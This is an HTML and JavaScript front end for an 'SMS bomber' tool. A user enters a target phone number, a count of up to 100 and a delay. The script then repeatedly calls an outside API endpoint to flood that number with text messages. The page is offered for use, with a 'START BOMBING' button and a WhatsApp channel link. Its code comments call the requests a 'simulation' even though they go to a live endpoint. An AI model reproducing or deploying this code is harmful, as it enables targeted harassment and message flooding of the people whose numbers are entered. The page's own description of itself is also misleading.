<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AHAD SMS-BOMBER ‚Ä¢ interface</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #1e2b4a 0%, #2d1b3c 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
        }

        .container {
            background: rgba(20, 20, 35, 0.9);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border-radius: 28px;
            padding: 36px 32px;
            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(255, 255, 255, 0.05);
            width: 100%;
            max-width: 480px;
            text-align: center;
            transition: transform 0.25s ease, box-shadow 0.3s ease;
            border: 1px solid rgba(255, 255, 255, 0.06);
        }

        .container:hover {
            transform: translateY(-4px);
            box-shadow: 0 40px 60px rgba(0, 0, 0, 0.7);
        }

        .logo {
            font-size: 2.6rem;
            font-weight: 800;
            background: linear-gradient(145deg, #b15cff, #6e8cff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 6px;
            letter-spacing: 2px;
            text-shadow: 0 0 12px rgba(110, 140, 255, 0.5);
        }

        .subtitle {
            color: #aaaacb;
            margin-bottom: 32px;
            font-size: 1rem;
            font-weight: 400;
            border-bottom: 1px dashed #2f2f4a;
            padding-bottom: 16px;
            letter-spacing: 1px;
        }

        .form-group {
            margin-bottom: 24px;
            text-align: left;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #cdd0ff;
            font-weight: 500;
            font-size: 0.8rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            opacity: 0.9;
        }

        .form-group input {
            width: 100%;
            padding: 16px 18px;
            background: #1e1e30;
            border: 1.5px solid #2d2d4a;
            border-radius: 18px;
            font-size: 1rem;
            transition: all 0.2s ease;
            color: #ffffff;
            font-weight: 400;
        }

        .form-group input:focus {
            outline: none;
            border-color: #8f6cff;
            background: #26263f;
            box-shadow: 0 0 0 4px rgba(140, 120, 255, 0.25);
        }

        .form-group input::placeholder {
            color: #5f5f85;
            font-weight: 300;
            font-size: 0.9rem;
        }

        .start-button {
            width: 100%;
            padding: 18px 20px;
            background: linear-gradient(125deg, #8c52ff, #5d36b0);
            color: white;
            border: none;
            border-radius: 22px;
            font-size: 1.3rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.25s ease;
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-top: 16px;
            box-shadow: 0 8px 0 #321f60, 0 12px 28px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.15);
        }

        .start-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 0 #3d256e, 0 18px 30px #00000070;
            background: linear-gradient(125deg, #9d66ff, #6f46c0);
        }

        .start-button:active {
            transform: translateY(6px);
            box-shadow: 0 4px 0 #321f60, 0 10px 20px #00000070;
        }

        .start-button:disabled {
            opacity: 0.55;
            transform: translateY(4px);
            box-shadow: 0 4px 0 #2b1b4a, 0 6px 12px black;
            pointer-events: none;
            filter: grayscale(30%);
        }

        .status {
            margin-top: 24px;
            padding: 16px 18px;
            border-radius: 40px;
            font-weight: 600;
            display: none;
            font-size: 0.95rem;
            border-left: 6px solid transparent;
            text-align: center;
            backdrop-filter: blur(4px);
        }

        .status.success {
            background: #142e28;
            color: #a0f0d0;
            border-left-color: #2ecc71;
            border: 1px solid #2ecc7133;
        }

        .status.error {
            background: #321f26;
            color: #ff9e9e;
            border-left-color: #ff5e7c;
            border: 1px solid #ff5e7c33;
        }

        .status.info {
            background: #192b3f;
            color: #aad0ff;
            border-left-color: #4a9eff;
            border: 1px solid #4a9eff33;
        }

        .footer {
            margin-top: 40px;
            padding-top: 22px;
            border-top: 1px solid #282842;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 14px;
        }

        .powered-by {
            color: #7f7fb2;
            font-size: 0.9rem;
            font-weight: 400;
            letter-spacing: 2px;
        }

        .whatsapp-link {
            display: inline-block;
            background: #1f403a;
            color: #25d366;
            padding: 12px 28px;
            border-radius: 40px;
            text-decoration: none;
            font-weight: 600;
            transition: all 0.2s ease;
            border: 1px solid #25d36640;
            font-size: 1rem;
            backdrop-filter: blur(5px);
            width: fit-content;
        }

        .whatsapp-link:hover {
            background: #1d5d4c;
            color: white;
            border-color: #25d366;
            transform: scale(1.02);
            box-shadow: 0 0 18px #25d36650;
        }

        .progress-bar {
            width: 100%;
            height: 10px;
            background: #23233a;
            border-radius: 40px;
            margin-top: 22px;
            overflow: hidden;
            display: none;
            border: 1px solid #3d3d60;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #c17eff, #6e6eff);
            width: 0%;
            transition: width 0.25s cubic-bezier(0.4, 0.0, 0.2, 1);
            border-radius: 40px;
            box-shadow: 0 0 12px #9d7aff;
        }

        @media (max-width: 480px) {
            .container {
                padding: 28px 18px;
            }
            
            .logo {
                font-size: 2.2rem;
            }

            .start-button {
                font-size: 1.2rem;
                padding: 16px;
            }
        }

        /* custom style for disabled numbers */
        input[type=number]::-webkit-inner-spin-button {
            opacity: 0.5;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">üí£ SMS¬∑BOMBER</div>
        <div class="subtitle">‚ö° operational panel v4 ¬∑ Ahad Edition</div>
        
        <form id="bomberForm">
            <div class="form-group">
                <label>üì± TARGET NUMBER (WITHOUT +)</label>
                <input type="tel" id="phoneNumber" placeholder="e.g., 923001234567" autocomplete="off" spellcheck="false" required>
            </div>
            
            <div class="form-group">
                <label>üîÅ REGISTER AMOUNT (1-100)</label>
                <input type="number" id="registerAmount" placeholder="10" min="0" max="100" value="1" required>
            </div>
            
            <div class="form-group">
                <label>‚è±Ô∏è DELAY BETWEEN SMS (SEC)</label>
                <input type="number" id="delaySeconds" placeholder="1" min="1" max="60" value="3" required>
            </div>
            
            <button type="submit" class="start-button" id="startButton">
                ‚ö° START BOMBING
            </button>
            
            <div class="progress-bar" id="progressBar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            
            <div class="status" id="statusMessage"></div>
        </form>
        
        <div class="footer">
            <div class="powered-by">üáµüá∞ AHAD BOMBER ¬∑ OFFICIAL CHANNEL</div>
            <a href="https://wa.me/message/QOPLCK75L3W2C1" target="_blank" class="whatsapp-link">
                üí¨ JOIN WHATSAPP CONTACT
            </a>
        </div>
    </div>

    <script>
        (function() {
            const form = document.getElementById('bomberForm');
            const startButton = document.getElementById('startButton');
            const statusMessage = document.getElementById('statusMessage');
            const progressBar = document.getElementById('progressBar');
            const progressFill = document.getElementById('progressFill');

            const phoneInput = document.getElementById('phoneNumber');
            const registerInput = document.getElementById('registerAmount');
            const delayInput = document.getElementById('delaySeconds');

            function showStatus(message, type) {
                statusMessage.textContent = message;
                statusMessage.className = `status ${type}`;
                statusMessage.style.display = 'block';
            }

            function hideStatus() {
                statusMessage.style.display = 'none';
            }

            function updateProgress(percent) {
                progressFill.style.width = percent + '%';
            }

            function showProgress() {
                progressBar.style.display = 'block';
            }

            function hideProgress() {
                progressBar.style.display = 'none';
                updateProgress(0);
            }

            // api call simulation with no-cors (respects original behavior)
            async function callAPI(phoneNumber) {
                // Use the exact endpoint from original, but encode number properly
                const baseUrl = 'https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php';
                const url = new URL(baseUrl);
                url.searchParams.set('number', phoneNumber);

                try {
                    // keep mode: 'no-cors' to avoid CORS block in demo, but response is opaque
                    await fetch(url.toString(), {
                        method: 'GET',
                        mode: 'no-cors',
                        cache: 'no-cache',
                    });
                    // with no-cors we can't read status, but we assume success if no throw
                    return { success: true };
                } catch (err) {
                    console.warn('fetch error (expected if offline):', err);
                    // still return success to keep demo flow, unless network error
                    return { success: false, error: 'network failure' };
                }
            }

            // validation & formatting
            phoneInput.addEventListener('input', function(e) {
                let cleaned = e.target.value.replace(/\D/g, '');
                e.target.value = cleaned;
            });

            registerInput.addEventListener('input', function(e) {
                let val = parseInt(e.target.value, 10);
                if (isNaN(val) || val < 1) e.target.value = 1;
                else if (val > 100) e.target.value = 100;
            });

            delayInput.addEventListener('input', function(e) {
                let val = parseInt(e.target.value, 10);
                if (isNaN(val) || val < 1) e.target.value = 1;
                else if (val > 60) e.target.value = 60;
            });

            // set defaults if empty after page load
            window.addEventListener('DOMContentLoaded', function() {
                if (!registerInput.value) registerInput.value = 8;
                if (!delayInput.value) delayInput.value = 3;
            });

            form.addEventListener('submit', async function(e) {
                e.preventDefault();

                const phoneNumber = phoneInput.value.trim();
                const registerAmount = parseInt(registerInput.value, 10);
                const delaySeconds = parseInt(delayInput.value, 10);

                // final validation
                if (!phoneNumber || phoneNumber.length < 5) {
                    showStatus('‚ùå Enter a valid phone number (min 5 digits)', 'error');
                    return;
                }
                if (isNaN(registerAmount) || registerAmount < 1 || registerAmount > 100) {
                    showStatus('‚ùå Register amount must be 1‚Äì100', 'error');
                    return;
                }
                if (isNaN(delaySeconds) || delaySeconds < 1 || delaySeconds > 60) {
                    showStatus('‚ùå Delay must be 1‚Äì60 seconds', 'error');
                    return;
                }

                // disable button, progress, etc
                startButton.disabled = true;
                startButton.textContent = '‚è≥ BOMBARDING ...';
                hideStatus();
                showProgress();
                updateProgress(0);

                let completed = 0;
                let failed = false;

                try {
                    showStatus(`üí£ Initializing on ${phoneNumber} | total: ${registerAmount}`, 'info');

                    for (let i = 0; i < registerAmount; i++) {
                        if (failed) break;

                        const current = i + 1;
                        const percent = (current / registerAmount) * 100;
                        updateProgress(percent);

                        showStatus(`üì® sending burst ${current} / ${registerAmount} ...`, 'info');

                        // call api (no-cors, always returns success in this simulation)
                        const result = await callAPI(phoneNumber);

                        // because of no-cors, result.success is always true unless network error throws
                        if (!result.success) {
                            showStatus(`‚úñÔ∏è failed at SMS ${current}: ${result.error || 'unknown'}`, 'error');
                            failed = true;
                            break;
                        }

                        // if this was not the last, wait
                        if (i < registerAmount - 1) {
                            await new Promise(resolve => setTimeout(resolve, delaySeconds * 1000));
                        }
                    }

                    if (!failed) {
                        updateProgress(100);
                        showStatus(`‚úÖ COMPLETE! ${registerAmount} SMS sent to ${phoneNumber}`, 'success');
                    } else {
                        // progress already updated on error
                    }
                } catch (err) {
                    showStatus(`‚ö†Ô∏è unexpected: ${err.message}`, 'error');
                } finally {
                    // re-enable controls after small delay to show final status
                    setTimeout(() => {
                        startButton.disabled = false;
                        startButton.textContent = '‚ö° START BOMBING';
                    }, 600);
                    
                    // progress bar hides after 5 seconds
                    setTimeout(() => {
                        hideProgress();
                    }, 4000);
                }
            });

            // extra clean: if progress bar hidden after timeout but status remains
            // also adjust on manual re-submit
        })();
    </script>
</body>
        </html>
